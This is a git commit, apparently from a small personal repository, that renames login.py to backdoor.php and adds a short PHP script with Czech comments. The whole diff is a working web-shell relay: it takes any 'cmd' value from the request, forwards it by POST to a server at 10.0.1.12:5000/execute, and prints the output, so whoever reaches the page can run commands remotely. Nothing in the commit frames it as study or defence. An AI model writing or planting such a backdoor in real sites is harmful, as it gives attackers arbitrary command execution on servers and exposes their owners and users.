dfef62b67df345ed39c1886e167580c64b67a20b
Fhchcjcjcjcjvkkvk <info@infopeklo.cz>
2024-12-14 11:01:37 +0100

    Update and rename login.py to backdoor.php

---
+++ backdoor.php
@@ -0,0 +1,21 @@
+<?php
+// Tento PHP skript bude posílat příkazy na Python server a vykonávat je.
+if (isset($_REQUEST['cmd'])) {
+    $cmd = $_REQUEST['cmd']; // Získá příkaz z URL
+    $url = 'http://10.0.1.12:5000/execute'; // Python server běží na localhostu a portu 5000
+
+    // Odesílání POST požadavku na Python server
+    $data = array('cmd' => $cmd);
+    $options = array(
+        'http' => array(
+            'method'  => 'POST',
+            'header'  => 'Content-type: application/x-www-form-urlencoded',
+            'content' => http_build_query($data)
+        )
+    );
+    $context  = stream_context_create($options);
+    $result = file_get_contents($url, false, $context);
+
+    echo $result; // Výstup z Python serveru
+}
+?>
